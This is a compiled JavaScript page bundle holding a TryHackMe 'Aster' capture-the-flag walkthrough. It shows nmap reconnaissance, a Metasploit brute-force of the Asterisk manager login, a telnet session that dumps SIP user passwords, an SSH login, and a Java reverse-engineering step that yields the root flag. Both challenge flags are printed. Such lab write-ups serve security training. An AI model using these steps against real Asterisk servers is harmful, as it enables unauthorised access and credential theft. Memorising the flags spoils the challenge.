"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[571],{3905:(e,t,n)=>{n.d(t,{Zo:()=>c,kt:()=>f});var a=n(67294);function r(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){r(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function s(e,t){if(null==e)return{};var n,a,r=function(e,t){if(null==e)return{};var n,a,r={},o=Object.keys(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||(r[n]=e[n]);return r}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(r[n]=e[n])}return r}var l=a.createContext({}),p=function(e){var t=a.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):i(i({},t),e)),n},c=function(e){var t=p(e.components);return a.createElement(l.Provider,{value:t},e.children)},u="mdxType",m={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},d=a.forwardRef((function(e,t){var n=e.components,r=e.mdxType,o=e.originalType,l=e.parentName,c=s(e,["components","mdxType","originalType","parentName"]),u=p(n),d=r,f=u["".concat(l,".").concat(d)]||u[d]||m[d]||o;return n?a.createElement(f,i(i({ref:t},c),{},{components:n})):a.createElement(f,i({ref:t},c))}));function f(e,t){var n=arguments,r=t&&t.mdxType;if("string"==typeof e||r){var o=n.length,i=new Array(o);i[0]=d;var s={};for(var l in t)hasOwnProperty.call(t,l)&&(s[l]=t[l]);s.originalType=e,s[u]="string"==typeof e?e:r,i[1]=s;for(var p=2;p<o;p++)i[p]=n[p];return a.createElement.apply(null,i)}return a.createElement.apply(null,n)}d.displayName="MDXCreateElement"},64197:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>l,contentTitle:()=>i,default:()=>m,frontMatter:()=>o,metadata:()=>s,toc:()=>p});var a=n(87462),r=(n(67294),n(3905));const o={},i="Aster",s={unversionedId:"Tryhackme/Aster/Aster",id:"Tryhackme/Aster/Aster",title:"Aster",description:"Hack my server dedicated for building communications applications.",source:"@site/writeups/Tryhackme/Aster/Aster.md",sourceDirName:"Tryhackme/Aster",slug:"/Tryhackme/Aster/",permalink:"/writeups/Tryhackme/Aster/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Anthem",permalink:"/writeups/Tryhackme/Anthem/"},next:{title:"AttackerKB",permalink:"/writeups/Tryhackme/AttackerKB/"}},l={},p=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Flags",id:"task-1-flags",level:2}],c={toc:p},u="wrapper";function m(e){let{components:t,...n}=e;return(0,r.kt)(u,(0,a.Z)({},c,n,{components:t,mdxType:"MDXLayout"}),(0,r.kt)("h1",{id:"aster"},"Aster"),(0,r.kt)("p",null,"Hack my server dedicated for building communications applications."),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/aster"},"Aster")),(0,r.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,r.kt)("li",{parentName:"ul"},"Reverse Engineering (Python)"),(0,r.kt)("li",{parentName:"ul"},"Metasploit (asterisk_login)"),(0,r.kt)("li",{parentName:"ul"},"Asterisk Call Manager"),(0,r.kt)("li",{parentName:"ul"},"Reverse Engineering (Java)")),(0,r.kt)("hr",null),(0,r.kt)("h2",{id:"task-1-flags"},"Task 1 Flags"),(0,r.kt)("p",null,"Are you able to complete the challenge?\nThe machine may take up to 3 minutes to boot and configure"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Aster$ sudo nmap -A -v -p- -T4 10.10.165.247\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-24 17:58 CEST\nNSE: Loaded 151 scripts for scanning.\nNSE: Script Pre-scanning.\nInitiating NSE at 17:58\nCompleted NSE at 17:58, 0.00s elapsed\nInitiating NSE at 17:58\nCompleted NSE at 17:58, 0.00s elapsed\nInitiating NSE at 17:58\nCompleted NSE at 17:58, 0.00s elapsed\nInitiating Ping Scan at 17:58\nScanning 10.10.165.247 [4 ports]\nCompleted Ping Scan at 17:58, 0.08s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 17:58\nCompleted Parallel DNS resolution of 1 host. at 17:58, 0.00s elapsed\nInitiating SYN Stealth Scan at 17:58\nScanning 10.10.165.247 [65535 ports]\nDiscovered open port 80/tcp on 10.10.165.247\nDiscovered open port 1720/tcp on 10.10.165.247\nDiscovered open port 22/tcp on 10.10.165.247\nDiscovered open port 5038/tcp on 10.10.165.247\nDiscovered open port 2000/tcp on 10.10.165.247\nCompleted SYN Stealth Scan at 17:58, 34.44s elapsed (65535 total ports)\nInitiating Service scan at 17:58\nScanning 5 services on 10.10.165.247\nCompleted Service scan at 17:59, 23.43s elapsed (5 services on 1 host)\nInitiating OS detection (try #1) against 10.10.165.247\nRetrying OS detection (try #2) against 10.10.165.247\nRetrying OS detection (try #3) against 10.10.165.247\nRetrying OS detection (try #4) against 10.10.165.247\nRetrying OS detection (try #5) against 10.10.165.247\nInitiating Traceroute at 17:59\nCompleted Traceroute at 17:59, 0.04s elapsed\nInitiating Parallel DNS resolution of 2 hosts. at 17:59\nCompleted Parallel DNS resolution of 2 hosts. at 17:59, 0.00s elapsed\nNSE: Script scanning 10.10.165.247.\nInitiating NSE at 17:59\nCompleted NSE at 17:59, 14.46s elapsed\nInitiating NSE at 17:59\nCompleted NSE at 17:59, 0.23s elapsed\nInitiating NSE at 17:59\nCompleted NSE at 17:59, 0.01s elapsed\nNmap scan report for 10.10.165.247\nHost is up (0.040s latency).\nNot shown: 65530 closed ports\nPORT     STATE SERVICE     VERSION\n22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 fe:e3:52:06:50:93:2e:3f:7a:aa:fc:69:dd:cd:14:a2 (RSA)\n|   256 9c:4d:fd:a4:4e:18:ca:e2:c0:01:84:8c:d2:7a:51:f2 (ECDSA)\n|_  256 c5:93:a6:0c:01:8a:68:63:d7:84:16:dc:2c:0a:96:1d (ED25519)\n80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))\n| http-methods:\n|_  Supported Methods: POST OPTIONS GET HEAD\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Aster CTF\n1720/tcp open  h323q931?\n2000/tcp open  cisco-sccp?\n5038/tcp open  asterisk    Asterisk Call Manager 5.0.2\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=10/24%OT=22%CT=1%CU=35784%PV=Y%DS=2%DC=T%G=Y%TM=5F944F\nOS:6E%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=107%TI=Z%CI=I%II=I%TS=8)OP\nOS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST\nOS:11NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)EC\nOS:N(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=\nOS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(\nOS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%\nOS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N\nOS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C\nOS:D=S)\n\nUptime guess: 0.031 days (since Sat Oct 24 17:14:24 2020)\nNetwork Distance: 2 hops\nTCP Sequence Prediction: Difficulty=261 (Good luck!)\nIP ID Sequence Generation: All zeros\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 1723/tcp)\nHOP RTT      ADDRESS\n1   39.67 ms 10.8.0.1\n2   39.80 ms 10.10.165.247\n\nNSE: Script Post-scanning.\nInitiating NSE at 17:59\nCompleted NSE at 17:59, 0.00s elapsed\nInitiating NSE at 17:59\nCompleted NSE at 17:59, 0.00s elapsed\nInitiating NSE at 17:59\nCompleted NSE at 17:59, 0.00s elapsed\nRead data files from: /usr/bin/../share/nmap\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 88.26 seconds\n           Raw packets sent: 66011 (2.909MB) | Rcvd: 65617 (2.628MB)\n")),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"http://10.10.165.247/"},"http://10.10.165.247/")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Aster$ uncompyle6 output.pyc\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-py"},"# uncompyle6 version 3.7.4\n# Python bytecode 2.7 (62211)\n# Decompiled from: Python 2.7.18 (default, Apr 20 2020, 20:30:41)\n# [GCC 9.3.0]\n# Embedded file name: ./output.py\n# Compiled at: 2020-08-11 08:59:35\nimport pyfiglet\no0OO00 = pyfiglet.figlet_format('Hello!!')\noO00oOo = '476f6f64206a6f622c2075736572202261646d696e2220746865206f70656e20736f75726365206672616d65776f726b20666f72206275696c64696e6720636f6d6d756e69636174696f6e732c20696e7374616c6c656420696e20746865207365727665722e'\nOOOo0 = bytes.fromhex(oO00oOo)\nOooo000o = OOOo0.decode('ASCII')\nif 0:\n    i1 * ii1IiI1i % OOooOOo / I11i / o0O / IiiIII111iI\nOo = '476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21'\nI1Ii11I1Ii1i = bytes.fromhex(Oo)\nOoo = I1Ii11I1Ii1i.decode('ASCII')\nif 0:\n    iii1I1I / O00oOoOoO0o0O.O0oo0OO0 + Oo0ooO0oo0oO.I1i1iI1i - II\nprint(o0OO00)\n# okay decompiling output.pyc\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/Aster$ python3 ./output.py\nGood job, user "admin" the open source framework for building communications, installed in the server.\nGood job reverser, python is very cool!Good job reverser, python is very cool!Good job reverser, python is very cool!\n _   _      _ _       _ _\n| | | | ___| | | ___ | | |\n| |_| |/ _ \\ | |/ _ \\| | |\n|  _  |  __/ | | (_) |_|_|\n|_| |_|\\___|_|_|\\___/(_|_)\n')),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/Aster$ msfconsole -q\n[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp\nmsf5 exploit(windows/smb/ms17_010_eternalblue) > use auxiliary/voip/asterisk_login\nmsf5 auxiliary(voip/asterisk_login) > options\n\nModule options (auxiliary/voip/asterisk_login):\n\n   Name              Current Setting                                                    Required  Description\n   ----              ---------------                                                    --------  -----------\n   BLANK_PASSWORDS   false                                                              no        Try blank passwords for all users\n   BRUTEFORCE_SPEED  5                                                                  yes       How fast to bruteforce, from 0 to 5\n   DB_ALL_CREDS      false                                                              no        Try each user/password couple stored in the current database\n   DB_ALL_PASS       false                                                              no        Add all passwords in the current database to the list\n   DB_ALL_USERS      false                                                              no        Add all users in the current database to the list\n   PASSWORD                                                                             no        A specific password to authenticate with\n   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt  no        The file that contains a list of probable passwords.\n   RHOSTS                                                                               yes       The target host(s), range CIDR identifier, or hosts file with syntax \'file:<path>\'\n   RPORT             5038                                                               yes       The target port (TCP)\n   STOP_ON_SUCCESS   false                                                              yes       Stop guessing when a credential works for a host\n   THREADS           1                                                                  yes       The number of concurrent threads (max one per host)\n   USERNAME                                                                             no        A specific username to authenticate as\n   USERPASS_FILE                                                                        no        File containing users and passwords separated by space, one pair per line\n   USER_AS_PASS      false                                                              no        Try the username as the password for all users\n   USER_FILE         /usr/share/metasploit-framework/data/wordlists/unix_users.txt      no        The file that contains a list of probable users accounts.\n   VERBOSE           true                                                               yes       Whether to print output for all attempts\n\nmsf5 auxiliary(voip/asterisk_login) > set username admin\nusername => admin\nmsf5 auxiliary(voip/asterisk_login) > set rhosts 10.10.165.247\nrhosts => 10.10.165.247\nmsf5 auxiliary(voip/asterisk_login) > run\n\n[*] 10.10.165.247:5038    - Initializing module...\n[+] 10.10.165.247:5038    - User: "admin" using pass: "" - can login on 10.10.165.247:5038!\n^C[*] 10.10.165.247:5038    - Caught interrupt from the console...\n[*] Auxiliary module execution completed\nmsf5 auxiliary(voip/asterisk_login) >\n')),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"abc123")),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"https://www.voip-info.org/asterisk-manager-example-login/"},"https://www.voip-info.org/asterisk-manager-example-login/")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Aster$ telnet 10.10.165.247 5038\nTrying 10.10.165.247...\nConnected to 10.10.165.247.\nEscape character is '^]'.\nAsterisk Call Manager/5.0.2\nAction: Login\nUsername: admin\nSecret: abc123\n\nResponse: Success\nMessage: Authentication accepted\n\nEvent: FullyBooted\nPrivilege: system,all\nUptime: 4731\nLastReload: 4731\nStatus: Fully Booted\n\nAction: command\nCommand:  sip show users\n\nResponse: Success\nMessage: Command output follows\nOutput: Username                   Secret           Accountcode      Def.Context      ACL  Forcerport\nOutput: 100                        100                               test             No   No\nOutput: 101                        101                               test             No   No\nOutput: harry                      p4ss#w0rd!#                       test             No   No\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"harry:p4ss#w0rd!#")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Aster$ ssh harry@10.10.165.247\nThe authenticity of host '10.10.165.247 (10.10.165.247)' can't be established.\nECDSA key fingerprint is SHA256:uYoqUlSuCJNRjK1VYSgTnlOma6s8oDJ15UmcifsD6nw.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.165.247' (ECDSA) to the list of known hosts.\nharry@10.10.165.247's password:\nWelcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-186-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\nLast login: Wed Aug 12 14:25:25 2020 from 192.168.85.1\nharry@ubuntu:~$ ls\nExample_Root.jar  user.txt\nharry@ubuntu:~$ cat user.txt\nthm{bas1c_aster1ck_explotat1on}\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"harry@ubuntu:~$ scp Example_Root.jar kali@10.8.106.222:/home/kali/CTFs/tryhackme/Aster\nThe authenticity of host '10.8.106.222 (10.8.106.222)' can't be established.\nECDSA key fingerprint is SHA256:xCE0Cpa4vJaXG1mwn7ciMO55E0R11HvAmXVl2ymdG+Y.\nAre you sure you want to continue connecting (yes/no)? yes\nWarning: Permanently added '10.8.106.222' (ECDSA) to the list of known hosts.\nkali@10.8.106.222's password:\nExample_Root.jar           100% 1094     1.1KB/s   00:00\nharry@ubuntu:~$\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-java"},'import java.io.IOException;\nimport java.io.FileWriter;\nimport java.io.File;\n\n//\n// Decompiled by Procyon v0.5.36\n//\n\npublic class Example_Root\n{\n    public static boolean isFileExists(final File file) {\n        return file.isFile();\n    }\n\n    public static void main(final String[] array) {\n        final File file = new File("/tmp/flag.dat");\n        try {\n            if (isFileExists(file)) {\n                final FileWriter fileWriter = new FileWriter("/home/harry/root.txt");\n                fileWriter.write("my secret <3 baby");\n                fileWriter.close();\n                System.out.println("Successfully wrote to the file.");\n            }\n        }\n        catch (IOException ex) {\n            System.out.println("An error occurred.");\n            ex.printStackTrace();\n        }\n    }\n}\n')),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"harry@ubuntu:~$ touch /tmp/flag.dat\nharry@ubuntu:~$ ls\nExample_Root.jar  root.txt  user.txt\nharry@ubuntu:~$ cat root.txt\nthm{fa1l_revers1ng_java}\n")),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"Compromise the machine and locate user.txt")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"thm{bas1c_aster1ck_explotat1on}")),(0,r.kt)("ol",{start:2},(0,r.kt)("li",{parentName:"ol"},"Reverse file and get root.txt")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"thm{fa1l_revers1ng_java}")))}m.isMDXComponent=!0}}]);